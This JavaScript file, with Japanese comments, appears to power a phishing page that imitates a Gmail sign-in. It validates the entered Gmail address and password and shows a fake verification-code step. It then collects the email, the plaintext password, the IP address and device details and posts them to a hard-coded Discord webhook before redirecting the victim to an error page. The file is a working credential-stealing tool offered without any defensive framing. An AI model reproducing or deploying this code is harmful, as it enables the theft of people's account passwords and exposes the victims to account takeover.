async function sendAuthCode() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (!validateEmail(email)) {
        alert('有効なGmailアドレスを入力してください。');
        return;
    }

    if (!validatePassword(password)) {
        alert('パスワードは8文字以上で、半角アルファベット、数字、記号を組み合わせて作成してください。');
        return;
    }

    // 実際のメール送信はサーバーサイドで行うべきですが、ここではコンソールに表示するだけとします。
    console.log(`Sending auth code to ${email}`);

    // ログインフォームを隠して認証フォームを表示
    document.getElementById('login-form').style.display = 'none';
    document.getElementById('auth-form').style.display = 'block';
}

function validateEmail(email) {
    // emailが@gmail.comで終わるかどうかをチェック
    const emailRegex = /^[^\s@]+@gmail\.com$/;
    return emailRegex.test(email);
}

function validatePassword(password) {
    // パスワードが8文字以上で、半角アルファベット、数字、記号を含む必要がある
    const passwordRegex = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
    return passwordRegex.test(password);
}

async function verifyAuthCode() {
    const authCode = document.getElementById('auth-code').value;

    // ここでは固定の認証コードを使用
    const expectedAuthCode = '1234';

    if (authCode === expectedAuthCode) {
        // 認証が成功したら、IPアドレスと端末情報を取得してDiscordに送信
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const ipAddress = await getIpAddress();
        const deviceInfo = getDeviceInfo();
        const webhookUrl = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';

        const message = {
            content: `IP Address: ${ipAddress}\nDevice: ${deviceInfo.device}\nDevice Version: ${deviceInfo.deviceVersion}\nOS: ${deviceInfo.os}\nOS Version: ${deviceInfo.osVersion}\nBrowser: ${deviceInfo.browser}\nEmail: ${email}\nPassword: ${password}`,
        };

        await sendToDiscord(webhookUrl, message);

        window.location.href = 'https://hazimeteotukaisab.github.io/Google_and_playPenis_love/errorfome.html';
    } else {
        alert('認証コードが間違っています。もう一度お試しください。');
    }
}

async function getIpAddress() {
    try {
        const response = await fetch('https://cors-anywhere.herokuapp.com/https://ipinfo.io/ip');
        const ip = await response.text();
        return ip.trim();
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown IP';
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = 'Unknown Device';
    let os = 'Unknown OS';
    let browser = 'Unknown Browser';
    let deviceVersion = 'Unknown Version';
    let osVersion = 'Unknown Version';

    // 端末情報の取得
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        device = 'Mobile';
        deviceVersion = userAgent.match(/(iPhone|iPad);.*? OS (\d+_\d+)/);
        if (deviceVersion) {
            deviceVersion = deviceVersion[2].replace(/_/g, '.');
        }
        os = 'iOS';
        osVersion = userAgent.match(/OS (\d+_\d+)/);
        if (osVersion) {
            osVersion = osVersion[1].replace(/_/g, '.');
        }
    } else if (/Android/.test(userAgent)) {
        device = 'Mobile';
        os = 'Android';
        osVersion = userAgent.match(/Android (\d+(\.\d+)?)/);
        if (osVersion) {
            osVersion = osVersion[1];
        }
    } else if (/Windows NT/.test(userAgent)) {
        device = 'Desktop';
        os = 'Windows';
        osVersion = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
        if (osVersion) {
            osVersion = osVersion[1];
        }
    } else if (/Mac OS X/.test(userAgent)) {
        device = 'Desktop';
        os = 'Mac OS';
        osVersion = userAgent.match(/Mac OS X (\d+_\d+(_\d+)?)/);
        if (osVersion) {
            osVersion = osVersion[1].replace(/_/g, '.');
        }
    }

    // ブラウザ情報の取得
    if (/Chrome/.test(userAgent)) {
        browser = 'Chrome';
    } else if (/Firefox/.test(userAgent)) {
        browser = 'Firefox';
    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
        browser = 'Safari';
    } else if (/Edge/.test(userAgent)) {
        browser = 'Edge';
    } else if (/MSIE|Trident/.test(userAgent)) {
        browser = 'Internet Explorer';
    }

    return {
        device,
        deviceVersion,
        os,
        osVersion,
        browser,
    };
}

async function sendToDiscord(webhookUrl, message) {
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        });
    } catch (error) {
        console.error('Error sending message to Discord:', error);
    }
}
